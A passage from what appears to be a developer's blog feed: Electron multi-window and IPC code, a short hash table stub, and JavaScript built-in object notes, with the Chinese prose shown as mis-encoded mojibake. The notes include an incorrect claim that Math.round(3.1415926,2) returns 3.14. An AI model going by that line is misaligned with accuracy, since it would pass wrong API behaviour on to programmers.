class="keyword">if</span> (isDev) &#123;</span><br><span class="line">    startUrl = <span class="string">`http://localhost:8000#<span class="subst">$&#123;hash&#125;</span>`</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    startUrl = url.format(&#123;</span><br><span class="line">      pathname: path.join(__dirname, <span class="string">'/../build/index.html'</span>),</span><br><span class="line">      protocol: <span class="string">'file:'</span>,</span><br><span class="line">      slashes: <span class="literal">false</span>,</span><br><span class="line">      hash</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  win[hash].loadURL(startUrl);</span><br><span class="line">  win[hash].on(<span class="string">'closed'</span>, () =&gt; &#123;</span><br><span class="line">    win[hash] = <span class="literal">null</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>æ¸²æŸ“è¿›ç¨‹ä¸­æ‰“å¼€æ–°çª—å£<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ipcRenderer.send(<span class="string">'newwin'</span>, &#123;</span><br><span class="line">  width,</span><br><span class="line">  height,</span><br><span class="line">  minWidth,</span><br><span class="line">  minHeight,</span><br><span class="line">  hash,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="8-å¤šä¸ªçª—å£ä¹‹é—´é€šä¿¡"><a href="#8-å¤šä¸ªçª—å£ä¹‹é—´é€šä¿¡" class="headerlink" title="8. å¤šä¸ªçª—å£ä¹‹é—´é€šä¿¡"></a>8. å¤šä¸ªçª—å£ä¹‹é—´é€šä¿¡</h3><p>è¿™é‡Œè®°å½•ä¸€ä¸ªéœ€æ±‚ï¼šæ‰“å¼€äº†ä¸€ä¸ªæ–°çª—å£ï¼Œåœ¨æ–°çª—å£ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®æ—¶ï¼Œä¼šè‡ªåŠ¨å…³é—­è¯¥çª—å£ï¼Œå¹¶åœ¨ä¸»çª—å£æ˜¾ç¤ºä¸€ä¸ªå°å¼¹çª—ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// electronå…¥å£æ–‡ä»¶</span></span><br><span class="line">ipcMain.on(<span class="string">'close-newwin'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; type &#125; = <span class="built_in">JSON</span>.parse(value);</span><br><span class="line">  <span class="comment">// ç›‘å¬çª—å£å‘ä¸»è¿›ç¨‹å‘é€æ¶ˆæ¯ï¼Œæ”¶åˆ°æ¶ˆæ¯åï¼Œå‘çˆ¶çª—å£çš„æ¸²æŸ“è¿›ç¨‹å‘æ¶ˆæ¯</span></span><br><span class="line">  mainWindow.webContents.send(<span class="string">'newmsg'</span>, value);</span><br><span class="line">  win[type].close();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="9-å…³é—­çª—å£äºŒæ¬¡ç¡®è®¤æ¡†"><a href="#9-å…³é—­çª—å£äºŒæ¬¡ç¡®è®¤æ¡†" class="headerlink" title="9. å…³é—­çª—å£äºŒæ¬¡ç¡®è®¤æ¡†"></a>9. å…³é—­çª—å£äºŒæ¬¡ç¡®è®¤æ¡†</h3><p>å…³é—­çª—å£æ—¶ï¼Œå¼¹å‡ºè‡ªå®šä¹‰å¼¹æ¡†ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// electronå…¥å£æ–‡ä»¶</span></span><br><span class="line"><span class="comment">// é˜»æ­¢é»˜è®¤closeäº‹ä»¶ï¼Œå…ˆæ¸²æŸ“è¿›ç¨‹å‘é€å¼¹å‡ºç¡®è®¤æ¡†çš„æ¶ˆæ¯</span></span><br><span class="line">mainWindow.on(<span class="string">'close'</span>, e =&gt; &#123;</span><br><span class="line">  e.preventDefault();</span><br><span class="line">  <span class="keyword">const</span> url = mainWindow.webContents.getURL();</span><br><span class="line">  mainWindow.webContents.send(<span class="string">'confirm-close-app'</span>, url);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¥æ”¶æ¸²æŸ“è¿›ç¨‹çš„close-appæ¶ˆæ¯ï¼Œæ”¶åˆ°åˆ™å…³é—­app</span></span><br><span class="line">ipcMain.on(<span class="string">'close-app'</span>, (event, value) =&gt; &#123;</span><br><span class="line">  mainWindow = <span class="literal">null</span>;</span><br><span class="line">  app.exit();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><p>æ¸²æŸ“è¿›ç¨‹ä¸­ï¼Œç›‘å¬confirm-close-app<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">componentDidMount() &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; ipcRenderer &#125; = <span class="built_in">window</span>.electron;</span><br><span class="line">    ipcRenderer.on(<span class="string">'confirm-close-app'</span>, (event, arg) =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">        <span class="comment">// æ˜¾ç¤ºå¼¹çª—</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// å…³é—­çª—å£</span></span><br><span class="line">        ipcRenderer.send(<span class="string">'close-app'</span>, <span class="string">'close'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h3><ul><li><a href="https://stackoverflow.com/questions/54011027/routing-doesnt-work-on-packaged-electron-app-using-reactjs-and-reach-router" target="_blank" rel="noopener">Routing doesnâ€™t work on packaged Electron app using ReactJS and reach-router</a></li><li><a href="https://stackoverflow.com/questions/44818508/how-do-i-move-a-frameless-window-in-electron-without-using-webkit-app-region" target="_blank" rel="noopener">How do I move a frameless window in Electron without using -webkit-app-region</a></li><li><a href="https://stackoverflow.com/questions/33505485/frameless-window-not-draggable-mac-osx" target="_blank" rel="noopener">Frameless window not draggable - Mac OSX</a></li></ul>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>å“ˆå¸Œè¡¨ã€æ˜ å°„ã€é›†åˆ</title>
      <link href="/2019/09/19/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/"/>
      <url>/2019/09/19/LeetCode-%E5%93%88%E5%B8%8C%E8%A1%A8/</url>
      <content type="html"><![CDATA[<h3 id="1-æ•°æ®ç»“æ„"><a href="#1-æ•°æ®ç»“æ„" class="headerlink" title="1. æ•°æ®ç»“æ„"></a>1. æ•°æ®ç»“æ„</h3><p>å“ˆå¸Œè¡¨ï¼Œæ˜¯æ ¹æ®å…³é”®ç å€¼(key value)è€Œç›´æ¥è¿›è¡Œè®¿é—®çš„æ•°æ®ç»“æ„ã€‚å®ƒé€šè¿‡æŠŠå…³é”®ç å€¼æ˜ å°„åˆ°è¡¨ä¸­ä¸€ä¸ªä½ç½®æ¥è®¿é—®è®°å½•ï¼Œä»¥åŠ é€ŸæŸ¥æ‰¾çš„é€Ÿåº¦ã€‚</p><ul><li>map æ˜ å°„</li><li>set é›†åˆ</li></ul>]]></content>
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>JSæ ‡å‡†å†…ç½®å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•</title>
      <link href="/2019/09/15/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/"/>
      <url>/2019/09/15/JS%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%B1%9E%E6%80%A7%E6%96%B9%E6%B3%95/</url>
      <content type="html"><![CDATA[<h3 id="1-åˆçº§"><a href="#1-åˆçº§" class="headerlink" title="1. åˆçº§"></a>1. åˆçº§</h3><h4 id="1-1-è¯­æ³•å’Œæ•°æ®ç±»å‹"><a href="#1-1-è¯­æ³•å’Œæ•°æ®ç±»å‹" class="headerlink" title="1.1 è¯­æ³•å’Œæ•°æ®ç±»å‹"></a>1.1 è¯­æ³•å’Œæ•°æ®ç±»å‹</h4><ul><li><p>å£°æ˜å˜é‡<br><code>var/let/const</code>ï¼Œ å¦‚æœæ²¡æœ‰èµ‹åˆå§‹å€¼ï¼Œåˆ™å…¶å€¼ä¸º<code>undefined</code>ï¼Œè¯•å›¾è®¿é—®ä¸€ä¸ªæœªå£°æ˜çš„å˜é‡ä¼šå¯¼è‡´ä¸€ä¸ª<code>ReferenceError</code>å¼‚å¸¸æŠ›å‡ºã€‚ä½ å¯ä»¥ä½¿ç”¨<code>undefined</code>æ¥åˆ¤æ–­å˜é‡æ˜¯å¦å·²èµ‹å€¼ã€‚<code>undefined</code>å€¼åœ¨å¸ƒå°”ç±»å‹ç¯å¢ƒä¸­ä¼šè¢«å½“åš<code>false</code>,åœ¨æ•°å€¼ç±»å‹ç¯å¢ƒä¸­ï¼Œä¼šè¢«è½¬æ¢ä¸º<code>NaN</code>ã€‚</p></li><li><p>å˜é‡çš„ä½œç”¨åŸŸ<br>å…¨å±€å˜é‡-åœ¨æ‰€æœ‰å‡½æ•°ä¹‹å¤–ç”Ÿå‘½çš„å˜é‡ï¼›å±€éƒ¨å˜é‡-åœ¨å‡½æ•°å†…éƒ¨ç”Ÿå‘½çš„å˜é‡ã€‚ES6ä¹‹å‰çš„jsæ²¡æœ‰è¯­å¥å—ä½œç”¨åŸŸã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(true)&#123;</span><br><span class="line">  var x = 5;</span><br><span class="line">  let y = 5;</span><br><span class="line">&#125;</span><br><span class="line">console.log(x);   // 5</span><br><span class="line">console.log(y);   // ReferenceError: y is not defined</span><br></pre></td></tr></table></figure></li><li><p>å˜é‡å£°æ˜æå‡<br>å˜é‡ä¼šè¢«æå‡æˆ–ç§»åˆ°äº†å‡½æ•°æˆ–è¯­å¥çš„é¡¶éƒ¨ã€‚ç„¶åæå‡åçš„å˜é‡å°†è¿”å›<code>undefined</code>å€¼ã€‚åœ¨ä½¿ç”¨æˆ–å¼•ç”¨æŸä¸ªå˜é‡ä¹‹åè¿›è¡Œå£°æ˜å’Œåˆå§‹åŒ–æ“ä½œã€‚<code>let</code>å°†ä¸ä¼šæå‡å˜é‡åˆ°ä»£ç å—çš„é¡¶éƒ¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">console.log(x === undefined)  // true</span><br><span class="line">var x = &apos;global value&apos;;</span><br><span class="line"></span><br><span class="line">(function()&#123;</span><br><span class="line">  console.log(x); // undefined</span><br><span class="line">  var x = &apos;local value&apos;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></li><li><p>å‡½æ•°æå‡<br>åªæœ‰å‡½æ•°å£°æ˜ä¼šè¢«æå‡åˆ°é¡¶éƒ¨ï¼Œè€Œä¸åŒ…å«å‡½æ•°çš„è¡¨è¾¾å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// å‡½æ•°å£°æ˜</span><br><span class="line">foo();   // &apos;bar&apos;</span><br><span class="line">function foo() &#123;</span><br><span class="line">  console.log(&apos;bar&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// å‡½æ•°è¡¨è¾¾å¼</span><br><span class="line">baz();  // TypeError: baz is not a function</span><br><span class="line">var baz = function() &#123;</span><br><span class="line">  console.log(&apos;baz&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><em>æ•°æ®ç±»å‹</em>: Boolean, null, undefined, Number, String, Symbol, Object</p></li><li><p><em>falseç­‰æ•ˆå€¼</em>: false, undefined, null, 0, NaN, â€˜â€™(ç©ºå­—ç¬¦ä¸²)<br><br></p></li></ul><h4 id="1-2-å¾ªç¯å’Œè¿­ä»£"><a href="#1-2-å¾ªç¯å’Œè¿­ä»£" class="headerlink" title="1.2 å¾ªç¯å’Œè¿­ä»£"></a>1.2 å¾ªç¯å’Œè¿­ä»£</h4><ul><li><p>break<br>ä½¿ç”¨<code>break</code>æ¥ç»ˆæ­¢å¾ªç¯ï¼Œå®ƒä¼šç«‹å³ç»ˆæ­¢å½“å‰æ‰€åœ¨çš„while, do-while, for, æˆ–è€…switchå¹¶æŠŠæ§åˆ¶æƒäº¤å›è¿™äº›ç»“æ„åé¢çš„è¯­å¥</p></li><li><p>continue<br><code>continue</code>è¯­å¥å¯ä»¥ç”¨æ¥ç»§ç»­æ‰§è¡Œï¼ˆè·³è¿‡ä»£ç å—çš„å‰©ä½™éƒ¨åˆ†å¹¶è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯ï¼‰ä¸€ä¸ªwhile, do-while, forè¯­å¥<br><br></p></li></ul><h4 id="1-3-å‡½æ•°"><a href="#1-3-å‡½æ•°" class="headerlink" title="1.3 å‡½æ•°"></a>1.3 å‡½æ•°</h4><p>åœ¨å‡½æ•°å†…å®šä¹‰çš„å˜é‡ä¸èƒ½åœ¨å‡½æ•°ä¹‹å¤–çš„ä»»ä½•åœ°æ–¹è®¿é—®ï¼Œç›¸åº”çš„ï¼Œä¸€ä¸ªå‡½æ•°å¯ä»¥è®¿é—®å®šä¹‰åœ¨å…¶èŒƒå›´å†…çš„ä»»ä½•å˜é‡å’Œå‡½æ•°ã€‚</p><ul><li><p>ç®­å¤´å‡½æ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var a2 = a.map(function(s)&#123; return s.length &#125;);</span><br><span class="line">var a3 = a.map(s =&gt; s.length)</span><br></pre></td></tr></table></figure></li><li><p>é¢„å®šä¹‰å‡½æ•°</p></li></ul><table><thead><tr><th>å‡½æ•°</th><th style="text-align:center"></th></tr></thead><tbody><tr><td>eval()</td><td style="text-align:center">å¯¹ä¸€ä¸²å­—ç¬¦ä¸²å½¢å¼çš„jsä»£ç å­—ç¬¦æ±‚å€¼</td></tr><tr><td>uneval()</td><td style="text-align:center">è¡¨ç¤ºç»™å®šå¯¹è±¡çš„æºä»£ç çš„å­—ç¬¦ä¸²</td></tr><tr><td>isFinite()</td><td style="text-align:center">åˆ¤æ–­æ˜¯å¦æ˜¯æœ‰é™çš„æ•°å€¼</td></tr><tr><td>isNaN()</td><td style="text-align:center">åˆ¤æ–­ä¸€ä¸ªå€¼æ˜¯å¦æ˜¯NaN</td></tr><tr><td>parseFloat()</td><td style="text-align:center">è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°</td></tr><tr><td>parseInt()</td><td style="text-align:center">è¿”å›ä¸€ä¸ªæ•´æ•°</td></tr><tr><td>encodeURI()ã€encodeURIComponent()</td><td style="text-align:center">æŠŠå­—ç¬¦ä¸²ä½œä¸ºURIè¿›è¡Œç¼–ç </td></tr><tr><td>decodeURI()ã€decoreURIComponent()</td><td style="text-align:center">å¯¹encodeURI()ç¼–ç è¿‡çš„URIè¿›è¡Œè§£ç </td></tr></tbody></table><p><br></p><h4 id="1-4-è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦"><a href="#1-4-è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦" class="headerlink" title="1.4 è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦"></a>1.4 è¡¨è¾¾å¼å’Œè¿ç®—ç¬¦</h4><table><thead><tr><th></th><th style="text-align:center">ä¸€å…ƒæ“ä½œç¬¦/å…³ç³»æ“ä½œç¬¦</th></tr></thead><tbody><tr><td>delete</td><td style="text-align:center"><code>delete objectName</code> / <code>delete objectName.property</code> / <code>delete arrayName[index]</code>ï¼Œdeleteæ“ä½œæˆåŠŸï¼Œå…ƒç´ ä¼šå˜æˆ<code>undefined</code>ã€‚DeleteæˆåŠŸè¿”å›<code>true</code>,ä¸æˆåŠŸè¿”å›<code>false</code></td></tr><tr><td>typeof</td><td style="text-align:center">è¿”å›ä¸€ä¸ªå˜é‡çš„ç±»å‹çš„å­—ç¬¦ä¸²å€¼ <code>return &quot;function/string/number/object/undefined/boolean&quot;</code></td></tr><tr><td>in</td><td style="text-align:center"><code>index in Array</code>, <code>propertName in object</code>ï¼Œå¦‚æœæ‰€æŒ‡å®šçš„å±æ€§å­˜åœ¨äºå¯¹è±¡ä¸­ï¼Œåˆ™è¿”å›<code>true</code></td></tr><tr><td>instanceof</td><td style="text-align:center">åˆ¤æ–­å¯¹è±¡æ˜¯ä¸æ˜¯æ‰€æŒ‡å®šçš„ç±»å‹<code>objectName instanceof objectType</code></td></tr></tbody></table><p><br></p><h4 id="1-5-Numberå¯¹è±¡"><a href="#1-5-Numberå¯¹è±¡" class="headerlink" title="1.5 Numberå¯¹è±¡"></a>1.5 Numberå¯¹è±¡</h4><ul><li><em>Numberçš„æ–¹æ³•</em><br>parseFloat(), parseInt(), isFinite(), isInteger(), isNaN(), isSafeInteger();</li><li><em>NumberåŸå‹ä¸Šçš„ä¸€äº›æ–¹æ³•</em><br><strong>toExponential()</strong>: è¿”å›ä¸€ä¸ªæ•°å­—çš„æŒ‡æ•°å½¢å¼çš„å­—ç¬¦ä¸²ï¼Œå½¢å¦‚: 1.23e+2;<br><strong>toFixed()</strong>: è¿”å›æŒ‡å®šå°æ•°ä½æ•°çš„è¡¨ç¤ºå½¢å¼ï¼Œ<code>var a = 123; a.toFixed(2) // 123.00</code><br><strong>toPrecision()</strong>: è¿”å›ä¸€ä¸ªæŒ‡å®šç²¾åº¦çš„æ•°å­—ï¼Œ <code>var a = 123; a.toPrecision(2) // 1.2e+2</code><br><br></li></ul><h4 id="1-6-Mathå¯¹è±¡"><a href="#1-6-Mathå¯¹è±¡" class="headerlink" title="1.6 Mathå¯¹è±¡"></a>1.6 Mathå¯¹è±¡</h4><ul><li><em>Mathå¸¸ç”¨æ–¹æ³•</em><br><strong>floor()</strong>     :å‘ä¸‹å–æ•´<br><strong>ceil()</strong>      :å‘ä¸Šå–æ•´<br><strong>min() max()</strong> :è¿”å›ä¸€ä¸ªä»¥é€—å·é—´éš”çš„æ•°å­—å‚æ•°åˆ—è¡¨ä¸­çš„æœ€å¤§/æœ€å°å€¼<br><strong>random()</strong>    :è¿”å›0å’Œ1ä¹‹é—´çš„éšæœºæ•°<br><strong>round(3.1415926,2)=3.14</strong></li><li><em>Mathè®¡ç®—æ–¹æ³•</em><br>PI, abs(), sin(),sqrt(), log10()ç­‰<br><br></li></ul><h4 id="1-7-Dateå¯¹è±¡"><a href="#1-7-Dateå¯¹è±¡" class="headerlink" title="1.7 Dateå¯¹è±¡"></a>1.7 Dateå¯¹è±¡</h4><p>Dateæ˜¯ä»¥1970å¹´1æœˆ1æ—¥00:00:00ä»¥æ¥çš„æ¯«ç§’æ•°æ¥å­˜å‚¨ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> today = <span class="keyword">new</span> <span class="built_in">Date</span>();  <span class="comment">// Thu Oct 17 2019 09:07:25 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">Date</span>(<span class="string">'December 25, 1995 13:00:00'</span>);</span><br><span class="line">today.getDate()       <span class="comment">// ä¸€ä¸ªæœˆä¸­çš„æŸä¸€å¤©(1-31)</span></span><br><span class="line">today.getDay()        <span class="comment">// ä¸€å‘¨ä¸­çš„æŸä¸€å¤©(0-6)</span></span><br><span class="line">today.getMonth()      <span class="comment">// æœˆ(0-11)</span></span><br><span class="line">today.getFullYear()   <span class="comment">// å¹´(å››ä½æ•°å­—)</span></span><br><span class="line">today.getHours()      <span class="comment">// å°æ—¶(0-23)</span></span><br><span class="line">today.getMinutes()    <span class="comment">// åˆ†é’Ÿ(0-59)</span></span><br><span class="line">today.getSeconds()    <span class="comment">// ç§’æ•°(0-59)</span></span><br><span class="line">today.getMilliseconds() <span class="comment">// æ¯«ç§’(0-999)</span></span><br><span class="line">today.getTime()       <span class="comment">// è¿”å›1970å¹´1æœˆ1æ—¥è‡³ä»Šçš„æ¯«ç§’æ•°</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="1-8-String"><a href="#1-8-String" class="headerlink" title="1.8 String"></a>1.8 String</h4><p>Stringç”¨äºè¡¨ç¤ºæ–‡æœ¬å‹çš„æ•°æ®ï¼Œå®ƒæ˜¯ç”±æ— ç¬¦å·æ•´æ•°å€¼(16bit)ä½œä¸ºå…ƒç´ è€Œç»„æˆçš„é›†åˆã€‚Unicodeè½¬ä¹‰åºåˆ—åœ¨\uä¹‹åéœ€è¦è‡³å°‘4ä¸ªå­—ç¬¦ã€‚</p><table><thead><tr><th></th><th style="text-align:center">Stringå¯¹è±¡æ–¹æ³•</th></tr></thead><tbody><tr><td>charAt, charCodeAt, codePointAt</td><td style="text-align:center">è¿”å›å­—ç¬¦ä¸²æŒ‡å®šä½ç½®çš„å­—ç¬¦æˆ–è€…å­—ç¬¦ç¼–ç  <code>&#39;hello&#39;.charAt(0) // &#39;h&#39;</code></td></tr><tr><td>indexOf, lastIndexOf</td><td style="text-align:center">è¿”å›å­—ç¬¦ä¸²ä¸­æŒ‡å®šå­ä¸²çš„ä½ç½®æˆ–æœ€åä½ç½®</td></tr><tr><td>startsWith, endsWith, includes</td><td style="text-align:center">è¿”å›å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šå­—ç¬¦ä¸²å¼€å§‹ã€ç»“æŸã€æˆ–åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²</td></tr><tr><td>concat</td><td style="text-align:center">è¿æ¥ä¸¤ä¸ªå­—ç¬¦ä¸²å¹¶è¿”å›æ–°çš„å­—ç¬¦ä¸²</td></tr><tr><td>fromCharCode, fromCodePoint</td><td style="text-align:center">ä»æŒ‡å®šçš„Unicodeå€¼åºåˆ—æ„é€ ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</td></tr><tr><td>split</td><td style="text-align:center">å°†å­—ç¬¦ä¸²åˆ†ç¦»æˆä¸€ä¸ªä¸ªå­ä¸²ï¼Œå¹¶æ”¾å…¥æ•°ç»„ä¸­</td></tr><tr><td>slice</td><td style="text-align:center">ä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æå–ç‰‡æ®µå¹¶ä½œä¸ºæ–°å­—ç¬¦ä¸²è¿”å›</td></tr><tr><td>substring,substr</td><td style="text-align:center">åˆ†åˆ«é€šè¿‡æŒ‡å®šèµ·å§‹å’Œç»“æŸä½ç½®ï¼Œèµ·å§‹ä½ç½®å’Œé•¿åº¦æ¥è¿”å›å­—ç¬¦ä¸²çš„æŒ‡å®šå­é›†</td></tr><tr><td>match, replace, search</td><td style="text-align:center">é€šè¿‡æ­£åˆ™è¡¨è¾¾å¼æ¥å·¥ä½œ</td></tr><tr><td>toLowerCase, toUpperCase</td><td style="text-align:center">è¿”å›å­—ç¬¦ä¸²çš„å°å†™ã€å¤§å†™è¡¨ç¤º</td></tr><tr><td>normalize</td><td style="text-align:center">æŒ‰ç…§æŒ‡å®šçš„Unicodeå½¢å¼å°†å­—ç¬¦ä¸²æ­£è§„åŒ–</td></tr><tr><td>repeat</td><td style="text-align:center">å°†å­—ç¬¦ä¸²å†…å®¹é‡å¤æŒ‡å®šæ¬¡æ•°åè¿”å›</td></tr><tr><td>trim</td><td style="text-align:center">å»æ‰å­—ç¬¦ä¸²å¼€å¤´å’Œç»“å°¾çš„ç©ºç™½å­—ç¬¦</td></tr></tbody></table><ul><li>æ¨¡æ¿å­—ç¬¦ä¸²<br>ä½¿ç”¨åå‹¾å·(``)åŒ…è£¹å†…å®¹ï¼Œå®ƒå¯ä»¥å®ç°å¤šè¡Œå­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²å†…æ’ç­‰ç‰¹æ€§ã€‚<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// å¤šè¡Œ</span><br><span class="line">&quot;line 1 \n\</span><br><span class="line"> line 2&quot;</span><br><span class="line">`line 1</span><br><span class="line"> line 2`</span><br><span class="line"></span><br><span class="line"> // åµŒå…¥è¡¨è¾¾å¼</span><br><span class="line"> &quot;fifteen is&quot; + (a + b) + &quot;years old&quot;</span><br><span class="line"> `fifteen $&#123; a + b &#125; years old`</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="1-9-æ­£åˆ™è¡¨è¾¾å¼"><a href="#1-9-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="1.9 æ­£åˆ™è¡¨è¾¾å¼"></a>1.9 æ­£åˆ™è¡¨è¾¾å¼</h4><p><code>let regex = new RegExp(/^[a-zA-Z]+[0-9]*W?_$/, &quot;gi&quot;)</code></p><table><thead><tr><th></th><th style="text-align:center">æ­£åˆ™è¡¨è¾¾å¼æ–¹æ³•</th></tr></thead><tbody><tr><td>exec</td><td style="text-align:center">åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥çœ‹åŒ¹é…çš„RegExpæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„æˆ–null</td></tr><tr><td>test</td><td style="text-align:center">åœ¨å­—ç¬¦ä¸²ä¸­æµ‹è¯•æ˜¯å¦åŒ¹é…çš„RegExpæ–¹æ³•ï¼Œè¿”å›trueæˆ–fasle</td></tr><tr><td>match</td><td style="text-align:center">åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾åŒ¹é…çš„stringæ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ªæ•°ç»„æˆ–null</td></tr><tr><td>search</td><td style="text-align:center">åœ¨å­—ç¬¦ä¸²ä¸­æµ‹è¯•åŒ¹é…çš„stringæ–¹æ³•ï¼Œè¿”å›åŒ¹é…åˆ°çš„ä½ç½®ç´¢å¼•ï¼Œæˆ–-1</td></tr><tr><td>replace</td><td style="text-align:center">åœ¨å­—ç¬¦ä¸²ä¸­æŸ¥æ‰¾åŒ¹é…çš„stringæ–¹æ³•ï¼Œå¹¶ä¸”æ›¿æ¢å­—ç¬¦ä¸²</td></tr><tr><td>split</td><td style="text-align:center">ä½¿ç”¨æ­£åˆ™åˆ†éš”ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå­˜å‚¨åˆ°æ•°ç»„ä¸­</td></tr></tbody></table><p><br></p><h4 id="1-10-Arrayå¯¹è±¡"><a href="#1-10-Arrayå¯¹è±¡" class="headerlink" title="1.10 Arrayå¯¹è±¡"></a>1.10 Arrayå¯¹è±¡</h4><p>æ•°ç»„æ˜¯ä¸€ä¸ªæœ‰åºçš„æ•°æ®é›†åˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æ•°ç»„åç§°å’Œç´¢å¼•è¿›è¡Œè®¿é—®ã€‚<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ele1, elem2, ..., elemN]</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(elem1, elem2, ..., elemN)</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(arrayLength)</span><br></pre></td></tr></table></figure></p><table><thead><tr><th>æ–¹æ³•</th><th style="text-align:center">æè¿°</th><th style="text-align:right">è¿”å›å€¼</th><th>åŸæ•°ç»„å˜æˆäº†</th></tr></thead><tbody><tr><td>concat</td><td 